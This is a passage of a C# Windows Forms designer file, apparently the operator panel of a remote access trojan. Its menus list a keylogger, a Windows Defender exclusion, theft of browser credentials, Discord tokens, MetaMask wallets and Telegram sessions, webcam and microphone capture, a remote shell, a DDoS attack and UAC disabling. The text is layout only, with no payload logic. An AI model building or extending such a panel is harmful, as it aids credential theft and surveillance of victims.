			this.ii.Images.SetKeyName(176, "PL.png");
			this.ii.Images.SetKeyName(177, "PN.png");
			this.ii.Images.SetKeyName(178, "PR.png");
			this.ii.Images.SetKeyName(179, "PS.png");
			this.ii.Images.SetKeyName(180, "PT.png");
			this.ii.Images.SetKeyName(181, "PW.png");
			this.ii.Images.SetKeyName(182, "PY.png");
			this.ii.Images.SetKeyName(183, "QA.png");
			this.ii.Images.SetKeyName(184, "RO.png");
			this.ii.Images.SetKeyName(185, "RS.png");
			this.ii.Images.SetKeyName(186, "RU.png");
			this.ii.Images.SetKeyName(187, "RW.png");
			this.ii.Images.SetKeyName(188, "SA.png");
			this.ii.Images.SetKeyName(189, "SB.png");
			this.ii.Images.SetKeyName(190, "SC.png");
			this.ii.Images.SetKeyName(191, "SD.png");
			this.ii.Images.SetKeyName(192, "SE.png");
			this.ii.Images.SetKeyName(193, "SG.png");
			this.ii.Images.SetKeyName(194, "SH.png");
			this.ii.Images.SetKeyName(195, "SI.png");
			this.ii.Images.SetKeyName(196, "SK.png");
			this.ii.Images.SetKeyName(197, "SL.png");
			this.ii.Images.SetKeyName(198, "SM.png");
			this.ii.Images.SetKeyName(199, "SN.png");
			this.ii.Images.SetKeyName(200, "SO.png");
			this.ii.Images.SetKeyName(201, "SR.png");
			this.ii.Images.SetKeyName(202, "SS.png");
			this.ii.Images.SetKeyName(203, "ST.png");
			this.ii.Images.SetKeyName(204, "SV.png");
			this.ii.Images.SetKeyName(205, "SY.png");
			this.ii.Images.SetKeyName(206, "SZ.png");
			this.ii.Images.SetKeyName(207, "TC.png");
			this.ii.Images.SetKeyName(208, "TD.png");
			this.ii.Images.SetKeyName(209, "TF.png");
			this.ii.Images.SetKeyName(210, "TG.png");
			this.ii.Images.SetKeyName(211, "TH.png");
			this.ii.Images.SetKeyName(212, "TJ.png");
			this.ii.Images.SetKeyName(213, "TK.png");
			this.ii.Images.SetKeyName(214, "TL.png");
			this.ii.Images.SetKeyName(215, "TM.png");
			this.ii.Images.SetKeyName(216, "TN.png");
			this.ii.Images.SetKeyName(217, "TO.png");
			this.ii.Images.SetKeyName(218, "TR.png");
			this.ii.Images.SetKeyName(219, "TT.png");
			this.ii.Images.SetKeyName(220, "TV.png");
			this.ii.Images.SetKeyName(221, "TW.png");
			this.ii.Images.SetKeyName(222, "TZ.png");
			this.ii.Images.SetKeyName(223, "UA.png");
			this.ii.Images.SetKeyName(224, "UG.png");
			this.ii.Images.SetKeyName(225, "US.png");
			this.ii.Images.SetKeyName(226, "UY.png");
			this.ii.Images.SetKeyName(227, "UZ.png");
			this.ii.Images.SetKeyName(228, "VA.png");
			this.ii.Images.SetKeyName(229, "VC.png");
			this.ii.Images.SetKeyName(230, "VE.png");
			this.ii.Images.SetKeyName(231, "VG.png");
			this.ii.Images.SetKeyName(232, "VI.png");
			this.ii.Images.SetKeyName(233, "VN.png");
			this.ii.Images.SetKeyName(234, "VU.png");
			this.ii.Images.SetKeyName(235, "WF.png");
			this.ii.Images.SetKeyName(236, "WS.png");
			this.ii.Images.SetKeyName(237, "YE.png");
			this.ii.Images.SetKeyName(238, "YT.png");
			this.ii.Images.SetKeyName(239, "ZA.png");
			this.ii.Images.SetKeyName(240, "ZM.png");
			this.ii.Images.SetKeyName(241, "ZW.png");
			this.TimerTask.Enabled = true;
			this.TimerTask.Interval = 5000;
			this.ThumbnailCap.Interval = 5000;
			this.ImageList1.ColorDepth = global::System.Windows.Forms.ColorDepth.Depth32Bit;
			this.ImageList1.ImageSize = new global::System.Drawing.Size(256, 156);
			this.ImageList1.TransparentColor = global::System.Drawing.Color.Transparent;
			this.Lv4.BackColor = global::System.Drawing.Color.White;
			this.Lv4.BorderStyle = global::System.Windows.Forms.BorderStyle.None;
			this.Lv4.ContextMenuStrip = this.Guna2ContextMenuStrip4;
			this.Lv4.Dock = global::System.Windows.Forms.DockStyle.Fill;
			this.Lv4.ForeColor = global::System.Drawing.Color.Black;
			this.Lv4.HideSelection = false;
			this.Lv4.LargeImageList = this.ImageList1;
			this.Lv4.Location = new global::System.Drawing.Point(73, 33);
			this.Lv4.Name = "Lv4";
			this.Lv4.Size = new global::System.Drawing.Size(842, 390);
			this.Lv4.TabIndex = 7;
			this.Lv4.UseCompatibleStateImageBehavior = false;
			this.Guna2ContextMenuStrip4.Items.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.ToolStripMenuItem4,
				this.ToolStripMenuItem6
			});
			this.Guna2ContextMenuStrip4.Name = "Guna2ContextMenuStrip2";
			this.Guna2ContextMenuStrip4.RenderStyle.ArrowColor = global::System.Drawing.Color.FromArgb(151, 143, 255);
			this.Guna2ContextMenuStrip4.RenderStyle.BorderColor = global::System.Drawing.Color.Gainsboro;
			this.Guna2ContextMenuStrip4.RenderStyle.ColorTable = null;
			this.Guna2ContextMenuStrip4.RenderStyle.RoundedEdges = true;
			this.Guna2ContextMenuStrip4.RenderStyle.SelectionArrowColor = global::System.Drawing.Color.White;
			this.Guna2ContextMenuStrip4.RenderStyle.SelectionBackColor = global::System.Drawing.Color.FromArgb(113, 74, 250);
			this.Guna2ContextMenuStrip4.RenderStyle.SelectionForeColor = global::System.Drawing.Color.White;
			this.Guna2ContextMenuStrip4.RenderStyle.SeparatorColor = global::System.Drawing.Color.Gainsboro;
			this.Guna2ContextMenuStrip4.RenderStyle.TextRenderingHint = global::System.Drawing.Text.TextRenderingHint.ClearTypeGridFit;
			this.Guna2ContextMenuStrip4.Size = new global::System.Drawing.Size(113, 48);
			this.ToolStripMenuItem4.BackColor = global::System.Drawing.Color.White;
			this.ToolStripMenuItem4.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("ToolStripMenuItem4.Image");
			this.ToolStripMenuItem4.Name = "ToolStripMenuItem4";
			this.ToolStripMenuItem4.Size = new global::System.Drawing.Size(112, 22);
			this.ToolStripMenuItem4.Text = "[ Start ]";
			this.ToolStripMenuItem6.BackColor = global::System.Drawing.Color.White;
			this.ToolStripMenuItem6.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("ToolStripMenuItem6.Image");
			this.ToolStripMenuItem6.Name = "ToolStripMenuItem6";
			this.ToolStripMenuItem6.Size = new global::System.Drawing.Size(112, 22);
			this.ToolStripMenuItem6.Text = "[ Stop ]";
			this.ImageList2.ColorDepth = global::System.Windows.Forms.ColorDepth.Depth8Bit;
			this.ImageList2.ImageSize = new global::System.Drawing.Size(16, 16);
			this.ImageList2.TransparentColor = global::System.Drawing.Color.Transparent;
			this.Guna2Panel2.Controls.Add(this.Guna2TextBox1);
			this.Guna2Panel2.Controls.Add(this.Guna2Panel3);
			this.Guna2Panel2.Controls.Add(this.Guna2Panel4);
			this.Guna2Panel2.Dock = global::System.Windows.Forms.DockStyle.Top;
			this.Guna2Panel2.Location = new global::System.Drawing.Point(0, 4);
			this.Guna2Panel2.Name = "Guna2Panel2";
			this.Guna2Panel2.Size = new global::System.Drawing.Size(915, 25);
			this.Guna2Panel2.TabIndex = 27;
			this.Guna2TextBox1.Animated = true;
			this.Guna2TextBox1.BorderRadius = 4;
			this.Guna2TextBox1.Cursor = global::System.Windows.Forms.Cursors.IBeam;
			this.Guna2TextBox1.DefaultText = "";
			this.Guna2TextBox1.DisabledState.BorderColor = global::System.Drawing.Color.FromArgb(208, 208, 208);
			this.Guna2TextBox1.DisabledState.FillColor = global::System.Drawing.Color.FromArgb(226, 226, 226);
			this.Guna2TextBox1.DisabledState.ForeColor = global::System.Drawing.Color.FromArgb(138, 138, 138);
			this.Guna2TextBox1.DisabledState.PlaceholderForeColor = global::System.Drawing.Color.FromArgb(138, 138, 138);
			this.Guna2TextBox1.Dock = global::System.Windows.Forms.DockStyle.Fill;
			this.Guna2TextBox1.FocusedState.BorderColor = global::System.Drawing.Color.FromArgb(94, 148, 255);
			this.Guna2TextBox1.Font = new global::System.Drawing.Font("Segoe UI", 9f);
			this.Guna2TextBox1.ForeColor = global::System.Drawing.Color.Black;
			this.Guna2TextBox1.HoverState.BorderColor = global::System.Drawing.Color.FromArgb(94, 148, 255);
			this.Guna2TextBox1.IconLeft = (global::System.Drawing.Image)componentResourceManager.GetObject("Guna2TextBox1.IconLeft");
			this.Guna2TextBox1.Location = new global::System.Drawing.Point(57, 0);
			this.Guna2TextBox1.Name = "Guna2TextBox1";
			this.Guna2TextBox1.PasswordChar = '\0';
			this.Guna2TextBox1.PlaceholderText = "Search";
			this.Guna2TextBox1.SelectedText = "";
			this.Guna2TextBox1.Size = new global::System.Drawing.Size(801, 25);
			this.Guna2TextBox1.TabIndex = 25;
			this.Guna2TextBox1.TextAlign = global::System.Windows.Forms.HorizontalAlignment.Center;
			this.Guna2Panel3.Dock = global::System.Windows.Forms.DockStyle.Left;
			this.Guna2Panel3.Location = new global::System.Drawing.Point(0, 0);
			this.Guna2Panel3.Name = "Guna2Panel3";
			this.Guna2Panel3.Size = new global::System.Drawing.Size(57, 25);
			this.Guna2Panel3.TabIndex = 27;
			this.Guna2Panel4.Dock = global::System.Windows.Forms.DockStyle.Right;
			this.Guna2Panel4.Location = new global::System.Drawing.Point(858, 0);
			this.Guna2Panel4.Name = "Guna2Panel4";
			this.Guna2Panel4.Size = new global::System.Drawing.Size(57, 25);
			this.Guna2Panel4.TabIndex = 28;
			this.Guna2Panel6.Controls.Add(this.Guna2Button7);
			this.Guna2Panel6.Controls.Add(this.Guna2Button6);
			this.Guna2Panel6.Controls.Add(this.Guna2Button5);
			this.Guna2Panel6.Controls.Add(this.Guna2Button4);
			this.Guna2Panel6.Controls.Add(this.Guna2Button3);
			this.Guna2Panel6.Controls.Add(this.Guna2Button2);
			this.Guna2Panel6.Controls.Add(this.Guna2Button1);
			this.Guna2Panel6.Dock = global::System.Windows.Forms.DockStyle.Left;
			this.Guna2Panel6.Location = new global::System.Drawing.Point(0, 33);
			this.Guna2Panel6.Name = "Guna2Panel6";
			this.Guna2Panel6.Size = new global::System.Drawing.Size(73, 390);
			this.Guna2Panel6.TabIndex = 36;
			this.Guna2Button7.BorderRadius = 6;
			this.Guna2Button7.DisabledState.BorderColor = global::System.Drawing.Color.DarkGray;
			this.Guna2Button7.DisabledState.CustomBorderColor = global::System.Drawing.Color.DarkGray;
			this.Guna2Button7.DisabledState.FillColor = global::System.Drawing.Color.FromArgb(169, 169, 169);
			this.Guna2Button7.DisabledState.ForeColor = global::System.Drawing.Color.FromArgb(141, 141, 141);
			this.Guna2Button7.FillColor = global::System.Drawing.Color.White;
			this.Guna2Button7.Font = new global::System.Drawing.Font("Segoe UI", 9f);
			this.Guna2Button7.ForeColor = global::System.Drawing.Color.White;
			this.Guna2Button7.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("Guna2Button7.Image");
			this.Guna2Button7.ImageSize = new global::System.Drawing.Size(19, 19);
			this.Guna2Button7.Location = new global::System.Drawing.Point(3, 163);
			this.Guna2Button7.Name = "Guna2Button7";
			this.Guna2Button7.Size = new global::System.Drawing.Size(67, 31);
			this.Guna2Button7.TabIndex = 6;
			this.Guna2Button6.BorderRadius = 6;
			this.Guna2Button6.DisabledState.BorderColor = global::System.Drawing.Color.DarkGray;
			this.Guna2Button6.DisabledState.CustomBorderColor = global::System.Drawing.Color.DarkGray;
			this.Guna2Button6.DisabledState.FillColor = global::System.Drawing.Color.FromArgb(169, 169, 169);
			this.Guna2Button6.DisabledState.ForeColor = global::System.Drawing.Color.FromArgb(141, 141, 141);
			this.Guna2Button6.FillColor = global::System.Drawing.Color.White;
			this.Guna2Button6.Font = new global::System.Drawing.Font("Segoe UI", 9f);
			this.Guna2Button6.ForeColor = global::System.Drawing.Color.White;
			this.Guna2Button6.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("Guna2Button6.Image");
			this.Guna2Button6.ImageSize = new global::System.Drawing.Size(19, 19);
			this.Guna2Button6.Location = new global::System.Drawing.Point(3, 200);
			this.Guna2Button6.Name = "Guna2Button6";
			this.Guna2Button6.Size = new global::System.Drawing.Size(67, 31);
			this.Guna2Button6.TabIndex = 5;
			this.Guna2Button5.BorderRadius = 6;
			this.Guna2Button5.Cursor = global::System.Windows.Forms.Cursors.Hand;
			this.Guna2Button5.DisabledState.BorderColor = global::System.Drawing.Color.DarkGray;
			this.Guna2Button5.DisabledState.CustomBorderColor = global::System.Drawing.Color.DarkGray;
			this.Guna2Button5.DisabledState.FillColor = global::System.Drawing.Color.FromArgb(169, 169, 169);
			this.Guna2Button5.DisabledState.ForeColor = global::System.Drawing.Color.FromArgb(141, 141, 141);
			this.Guna2Button5.FillColor = global::System.Drawing.Color.White;
			this.Guna2Button5.Font = new global::System.Drawing.Font("Segoe UI", 9f);
			this.Guna2Button5.ForeColor = global::System.Drawing.Color.White;
			this.Guna2Button5.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("Guna2Button5.Image");
			this.Guna2Button5.ImageSize = new global::System.Drawing.Size(22, 22);
			this.Guna2Button5.Location = new global::System.Drawing.Point(3, 237);
			this.Guna2Button5.Name = "Guna2Button5";
			this.Guna2Button5.Size = new global::System.Drawing.Size(67, 150);
			this.Guna2Button5.TabIndex = 4;
			this.Guna2Button4.BorderRadius = 6;
			this.Guna2Button4.DisabledState.BorderColor = global::System.Drawing.Color.DarkGray;
			this.Guna2Button4.DisabledState.CustomBorderColor = global::System.Drawing.Color.DarkGray;
			this.Guna2Button4.DisabledState.FillColor = global::System.Drawing.Color.FromArgb(169, 169, 169);
			this.Guna2Button4.DisabledState.ForeColor = global::System.Drawing.Color.FromArgb(141, 141, 141);
			this.Guna2Button4.FillColor = global::System.Drawing.Color.White;
			this.Guna2Button4.Font = new global::System.Drawing.Font("Segoe UI", 9f);
			this.Guna2Button4.ForeColor = global::System.Drawing.Color.White;
			this.Guna2Button4.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("Guna2Button4.Image");
			this.Guna2Button4.ImageSize = new global::System.Drawing.Size(19, 19);
			this.Guna2Button4.Location = new global::System.Drawing.Point(3, 126);
			this.Guna2Button4.Name = "Guna2Button4";
			this.Guna2Button4.Size = new global::System.Drawing.Size(67, 31);
			this.Guna2Button4.TabIndex = 3;
			this.Guna2Button3.BorderRadius = 6;
			this.Guna2Button3.DisabledState.BorderColor = global::System.Drawing.Color.DarkGray;
			this.Guna2Button3.DisabledState.CustomBorderColor = global::System.Drawing.Color.DarkGray;
			this.Guna2Button3.DisabledState.FillColor = global::System.Drawing.Color.FromArgb(169, 169, 169);
			this.Guna2Button3.DisabledState.ForeColor = global::System.Drawing.Color.FromArgb(141, 141, 141);
			this.Guna2Button3.FillColor = global::System.Drawing.Color.White;
			this.Guna2Button3.Font = new global::System.Drawing.Font("Segoe UI", 9f);
			this.Guna2Button3.ForeColor = global::System.Drawing.Color.White;
			this.Guna2Button3.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("Guna2Button3.Image");
			this.Guna2Button3.ImageSize = new global::System.Drawing.Size(19, 19);
			this.Guna2Button3.Location = new global::System.Drawing.Point(3, 89);
			this.Guna2Button3.Name = "Guna2Button3";
			this.Guna2Button3.Size = new global::System.Drawing.Size(67, 31);
			this.Guna2Button3.TabIndex = 2;
			this.Guna2Button2.BorderRadius = 6;
			this.Guna2Button2.DisabledState.BorderColor = global::System.Drawing.Color.DarkGray;
			this.Guna2Button2.DisabledState.CustomBorderColor = global::System.Drawing.Color.DarkGray;
			this.Guna2Button2.DisabledState.FillColor = global::System.Drawing.Color.FromArgb(169, 169, 169);
			this.Guna2Button2.DisabledState.ForeColor = global::System.Drawing.Color.FromArgb(141, 141, 141);
			this.Guna2Button2.FillColor = global::System.Drawing.Color.White;
			this.Guna2Button2.Font = new global::System.Drawing.Font("Segoe UI", 9f);
			this.Guna2Button2.ForeColor = global::System.Drawing.Color.White;
			this.Guna2Button2.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("Guna2Button2.Image");
			this.Guna2Button2.ImageSize = new global::System.Drawing.Size(19, 19);
			this.Guna2Button2.Location = new global::System.Drawing.Point(3, 52);
			this.Guna2Button2.Name = "Guna2Button2";
			this.Guna2Button2.Size = new global::System.Drawing.Size(67, 31);
			this.Guna2Button2.TabIndex = 1;
			this.Guna2Button1.BorderRadius = 6;
			this.Guna2Button1.DisabledState.BorderColor = global::System.Drawing.Color.DarkGray;
			this.Guna2Button1.DisabledState.CustomBorderColor = global::System.Drawing.Color.DarkGray;
			this.Guna2Button1.DisabledState.FillColor = global::System.Drawing.Color.FromArgb(169, 169, 169);
			this.Guna2Button1.DisabledState.ForeColor = global::System.Drawing.Color.FromArgb(141, 141, 141);
			this.Guna2Button1.FillColor = global::System.Drawing.Color.White;
			this.Guna2Button1.Font = new global::System.Drawing.Font("Segoe UI", 9f);
			this.Guna2Button1.ForeColor = global::System.Drawing.Color.White;
			this.Guna2Button1.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("Guna2Button1.Image");
			this.Guna2Button1.ImageSize = new global::System.Drawing.Size(19, 19);
			this.Guna2Button1.Location = new global::System.Drawing.Point(3, 15);
			this.Guna2Button1.Name = "Guna2Button1";
			this.Guna2Button1.Size = new global::System.Drawing.Size(67, 31);
			this.Guna2Button1.TabIndex = 0;
			this.Guna2ContextMenuStrip2.Items.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.ToolStripMenuItem7
			});
			this.Guna2ContextMenuStrip2.Name = "Guna2ContextMenuStrip2";
			this.Guna2ContextMenuStrip2.RenderStyle.ArrowColor = global::System.Drawing.Color.FromArgb(151, 143, 255);
			this.Guna2ContextMenuStrip2.RenderStyle.BorderColor = global::System.Drawing.Color.Gainsboro;
			this.Guna2ContextMenuStrip2.RenderStyle.ColorTable = null;
			this.Guna2ContextMenuStrip2.RenderStyle.RoundedEdges = true;
			this.Guna2ContextMenuStrip2.RenderStyle.SelectionArrowColor = global::System.Drawing.Color.White;
			this.Guna2ContextMenuStrip2.RenderStyle.SelectionBackColor = global::System.Drawing.Color.FromArgb(113, 74, 250);
			this.Guna2ContextMenuStrip2.RenderStyle.SelectionForeColor = global::System.Drawing.Color.White;
			this.Guna2ContextMenuStrip2.RenderStyle.SeparatorColor = global::System.Drawing.Color.Gainsboro;
			this.Guna2ContextMenuStrip2.RenderStyle.TextRenderingHint = global::System.Drawing.Text.TextRenderingHint.ClearTypeGridFit;
			this.Guna2ContextMenuStrip2.Size = new global::System.Drawing.Size(116, 26);
			this.ToolStripMenuItem7.BackColor = global::System.Drawing.Color.White;
			this.ToolStripMenuItem7.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("ToolStripMenuItem7.Image");
			this.ToolStripMenuItem7.Name = "ToolStripMenuItem7";
			this.ToolStripMenuItem7.Size = new global::System.Drawing.Size(115, 22);
			this.ToolStripMenuItem7.Text = "[ Clear ]";
			this.Guna2ContextMenuStrip1.Items.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.FromDiskToolStripMenuItem,
				this.FromLinkToolStripMenuItem,
				this.FromMemoryToolStripMenuItem1,
				this.OpenUrlToolStripMenuItem2,
				this.KeyloggerToolStripMenuItem,
				this.WDExclusionToolStripMenuItem1,
				this.RecoveryToolStripMenuItem1,
				this.UpdateAllClientsToolStripMenuItem1,
				this.RemoveTaskToolStripMenuItem1
			});
			this.Guna2ContextMenuStrip1.Name = "Guna2ContextMenuStrip2";
			this.Guna2ContextMenuStrip1.RenderStyle.ArrowColor = global::System.Drawing.Color.FromArgb(151, 143, 255);
			this.Guna2ContextMenuStrip1.RenderStyle.BorderColor = global::System.Drawing.Color.Gainsboro;
			this.Guna2ContextMenuStrip1.RenderStyle.ColorTable = null;
			this.Guna2ContextMenuStrip1.RenderStyle.RoundedEdges = true;
			this.Guna2ContextMenuStrip1.RenderStyle.SelectionArrowColor = global::System.Drawing.Color.White;
			this.Guna2ContextMenuStrip1.RenderStyle.SelectionBackColor = global::System.Drawing.Color.FromArgb(113, 74, 250);
			this.Guna2ContextMenuStrip1.RenderStyle.SelectionForeColor = global::System.Drawing.Color.White;
			this.Guna2ContextMenuStrip1.RenderStyle.SeparatorColor = global::System.Drawing.Color.Gainsboro;
			this.Guna2ContextMenuStrip1.RenderStyle.TextRenderingHint = global::System.Drawing.Text.TextRenderingHint.ClearTypeGridFit;
			this.Guna2ContextMenuStrip1.Size = new global::System.Drawing.Size(166, 202);
			this.FromDiskToolStripMenuItem.BackColor = global::System.Drawing.Color.White;
			this.FromDiskToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("FromDiskToolStripMenuItem.Image");
			this.FromDiskToolStripMenuItem.Name = "FromDiskToolStripMenuItem";
			this.FromDiskToolStripMenuItem.Size = new global::System.Drawing.Size(165, 22);
			this.FromDiskToolStripMenuItem.Text = "[ From Disk ]";
			this.FromLinkToolStripMenuItem.BackColor = global::System.Drawing.Color.White;
			this.FromLinkToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("FromLinkToolStripMenuItem.Image");
			this.FromLinkToolStripMenuItem.Name = "FromLinkToolStripMenuItem";
			this.FromLinkToolStripMenuItem.Size = new global::System.Drawing.Size(165, 22);
			this.FromLinkToolStripMenuItem.Text = "[ From Link ]";
			this.FromMemoryToolStripMenuItem1.BackColor = global::System.Drawing.Color.White;
			this.FromMemoryToolStripMenuItem1.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("FromMemoryToolStripMenuItem1.Image");
			this.FromMemoryToolStripMenuItem1.Name = "FromMemoryToolStripMenuItem1";
			this.FromMemoryToolStripMenuItem1.Size = new global::System.Drawing.Size(165, 22);
			this.FromMemoryToolStripMenuItem1.Text = "[ From Memory ]";
			this.OpenUrlToolStripMenuItem2.BackColor = global::System.Drawing.Color.White;
			this.OpenUrlToolStripMenuItem2.DropDownItems.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.VisibleToolStripMenuItem2,
				this.InvisibleToolStripMenuItem2
			});
			this.OpenUrlToolStripMenuItem2.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("OpenUrlToolStripMenuItem2.Image");
			this.OpenUrlToolStripMenuItem2.Name = "OpenUrlToolStripMenuItem2";
			this.OpenUrlToolStripMenuItem2.Size = new global::System.Drawing.Size(165, 22);
			this.OpenUrlToolStripMenuItem2.Text = "[ Open Url ]";
			this.VisibleToolStripMenuItem2.BackColor = global::System.Drawing.Color.White;
			this.VisibleToolStripMenuItem2.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("VisibleToolStripMenuItem2.Image");
			this.VisibleToolStripMenuItem2.Name = "VisibleToolStripMenuItem2";
			this.VisibleToolStripMenuItem2.Size = new global::System.Drawing.Size(131, 22);
			this.VisibleToolStripMenuItem2.Text = "[ Visible ]";
			this.InvisibleToolStripMenuItem2.BackColor = global::System.Drawing.Color.White;
			this.InvisibleToolStripMenuItem2.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("InvisibleToolStripMenuItem2.Image");
			this.InvisibleToolStripMenuItem2.Name = "InvisibleToolStripMenuItem2";
			this.InvisibleToolStripMenuItem2.Size = new global::System.Drawing.Size(131, 22);
			this.InvisibleToolStripMenuItem2.Text = "[ Invisible ]";
			this.KeyloggerToolStripMenuItem.BackColor = global::System.Drawing.Color.White;
			this.KeyloggerToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("KeyloggerToolStripMenuItem.Image");
			this.KeyloggerToolStripMenuItem.Name = "KeyloggerToolStripMenuItem";
			this.KeyloggerToolStripMenuItem.Size = new global::System.Drawing.Size(165, 22);
			this.KeyloggerToolStripMenuItem.Text = "[ Keylogger ]";
			this.WDExclusionToolStripMenuItem1.BackColor = global::System.Drawing.Color.White;
			this.WDExclusionToolStripMenuItem1.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("WDExclusionToolStripMenuItem1.Image");
			this.WDExclusionToolStripMenuItem1.Name = "WDExclusionToolStripMenuItem1";
			this.WDExclusionToolStripMenuItem1.Size = new global::System.Drawing.Size(165, 22);
			this.WDExclusionToolStripMenuItem1.Text = "[ WDExclusion ]";
			this.RecoveryToolStripMenuItem1.BackColor = global::System.Drawing.Color.White;
			this.RecoveryToolStripMenuItem1.DropDownItems.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.V20AutoToolStripMenuItem1,
				this.RunRecoveryToolStripMenuItem1,
				this.ChromiumToolStripMenuItem1,
				this.DiscordTokenToolStripMenuItem1,
				this.MetaMaskToolStripMenuItem2,
				this.TelegramSessionToolStripMenuItem1
			});
			this.RecoveryToolStripMenuItem1.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("RecoveryToolStripMenuItem1.Image");
			this.RecoveryToolStripMenuItem1.Name = "RecoveryToolStripMenuItem1";
			this.RecoveryToolStripMenuItem1.Size = new global::System.Drawing.Size(165, 22);
			this.RecoveryToolStripMenuItem1.Text = "[ Recovery ]";
			this.V20AutoToolStripMenuItem1.BackColor = global::System.Drawing.Color.White;
			this.V20AutoToolStripMenuItem1.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("V20AutoToolStripMenuItem1.Image");
			this.V20AutoToolStripMenuItem1.Name = "V20AutoToolStripMenuItem1";
			this.V20AutoToolStripMenuItem1.Size = new global::System.Drawing.Size(175, 22);
			this.V20AutoToolStripMenuItem1.Text = "[ V20Recovery ]";
			this.RunRecoveryToolStripMenuItem1.BackColor = global::System.Drawing.Color.White;
			this.RunRecoveryToolStripMenuItem1.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("RunRecoveryToolStripMenuItem1.Image");
			this.RunRecoveryToolStripMenuItem1.Name = "RunRecoveryToolStripMenuItem1";
			this.RunRecoveryToolStripMenuItem1.Size = new global::System.Drawing.Size(175, 22);
			this.RunRecoveryToolStripMenuItem1.Text = "[ RunRecovery ]";
			this.ChromiumToolStripMenuItem1.BackColor = global::System.Drawing.Color.White;
			this.ChromiumToolStripMenuItem1.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("ChromiumToolStripMenuItem1.Image");
			this.ChromiumToolStripMenuItem1.Name = "ChromiumToolStripMenuItem1";
			this.ChromiumToolStripMenuItem1.Size = new global::System.Drawing.Size(175, 22);
			this.ChromiumToolStripMenuItem1.Text = "[ Chromium ]";
			this.DiscordTokenToolStripMenuItem1.BackColor = global::System.Drawing.Color.White;
			this.DiscordTokenToolStripMenuItem1.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("DiscordTokenToolStripMenuItem1.Image");
			this.DiscordTokenToolStripMenuItem1.Name = "DiscordTokenToolStripMenuItem1";
			this.DiscordTokenToolStripMenuItem1.Size = new global::System.Drawing.Size(175, 22);
			this.DiscordTokenToolStripMenuItem1.Text = "[ DiscordToken ]";
			this.MetaMaskToolStripMenuItem2.BackColor = global::System.Drawing.Color.White;
			this.MetaMaskToolStripMenuItem2.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("MetaMaskToolStripMenuItem2.Image");
			this.MetaMaskToolStripMenuItem2.Name = "MetaMaskToolStripMenuItem2";
			this.MetaMaskToolStripMenuItem2.Size = new global::System.Drawing.Size(175, 22);
			this.MetaMaskToolStripMenuItem2.Text = "[ MetaMask ]";
			this.TelegramSessionToolStripMenuItem1.BackColor = global::System.Drawing.Color.White;
			this.TelegramSessionToolStripMenuItem1.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("TelegramSessionToolStripMenuItem1.Image");
			this.TelegramSessionToolStripMenuItem1.Name = "TelegramSessionToolStripMenuItem1";
			this.TelegramSessionToolStripMenuItem1.Size = new global::System.Drawing.Size(175, 22);
			this.TelegramSessionToolStripMenuItem1.Text = "[ TelegramSession ]";
			this.UpdateAllClientsToolStripMenuItem1.BackColor = global::System.Drawing.Color.White;
			this.UpdateAllClientsToolStripMenuItem1.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("UpdateAllClientsToolStripMenuItem1.Image");
			this.UpdateAllClientsToolStripMenuItem1.Name = "UpdateAllClientsToolStripMenuItem1";
			this.UpdateAllClientsToolStripMenuItem1.Size = new global::System.Drawing.Size(165, 22);
			this.UpdateAllClientsToolStripMenuItem1.Text = "[ Update Clients ]";
			this.RemoveTaskToolStripMenuItem1.BackColor = global::System.Drawing.Color.White;
			this.RemoveTaskToolStripMenuItem1.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("RemoveTaskToolStripMenuItem1.Image");
			this.RemoveTaskToolStripMenuItem1.Name = "RemoveTaskToolStripMenuItem1";
			this.RemoveTaskToolStripMenuItem1.Size = new global::System.Drawing.Size(165, 22);
			this.RemoveTaskToolStripMenuItem1.Text = "[ RemoveTask ]";
			this.Guna2ContextMenuStrip3.BackColor = global::System.Drawing.Color.White;
			this.Guna2ContextMenuStrip3.Items.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.InformationToolStripMenuItem1,
				this.MonitorToolStripMenuItem,
				this.RunFileToolStripMenuItem,
				this.WebCamToolStripMenuItem1,
				this.MicrophoneToolStripMenuItem1,
				this.SystemSoundToolStripMenuItem1,
				this.OpenUrlToolStripMenuItem1,
				this.OptionsToolStripMenuItem,
				this.ShellToolStripMenuItem,
				this.KitToolStripMenuItem1,
				this.FileManagerToolStripMenuItem1,
				this.RecoveryOptionsToolStripMenuItem,
				this.RegistryEditorToolStripMenuItem1,
				this.ActiveWindowsToolStripMenuItem1,
				this.TCPConnectionsToolStripMenuItem,
				this.StartupManagerToolStripMenuItem1,
				this.ProcessManagerToolStripMenuItem1,
				this.ServiceManagerToolStripMenuItem1,
				this.ClipboardManagerToolStripMenuItem1,
				this.InstalledProgramsToolStripMenuItem1,
				this.VBNetCompilerToolStripMenuItem1,
				this.DDosAttackToolStripMenuItem1,
				this.LocationManagerToolStripMenuItem,
				this.PastimeToolStripMenuItem1,
				this.PowerToolStripMenuItem2,
				this.DisableUACToolStripMenuItem,
				this.Extra1ToolStripMenuItem,
